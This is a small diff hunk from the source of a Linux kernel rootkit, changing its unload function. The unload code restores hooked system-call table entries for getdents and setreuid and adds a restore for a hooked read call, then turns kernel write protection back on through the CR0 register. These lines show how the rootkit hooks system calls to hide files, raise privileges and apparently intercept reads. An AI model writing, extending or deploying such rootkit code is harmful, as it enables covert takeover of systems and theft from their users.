@@ -433,6 +433,7 @@ static void __exit rootkit_exit(void){
 	// We must undo the changes to the sys call table or our systems get fucked
 	sys_call_address[__NR_getdents] = original_getdents;
 	sys_call_address[__NR_setreuid] = old_setreuid;
+	sys_call_address[__NR_read] = original_sys_read;
 	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
 	printk(KERN_INFO "Rootkit Unloaded\n");
 	if(kern_path("/proc", 0, &p))
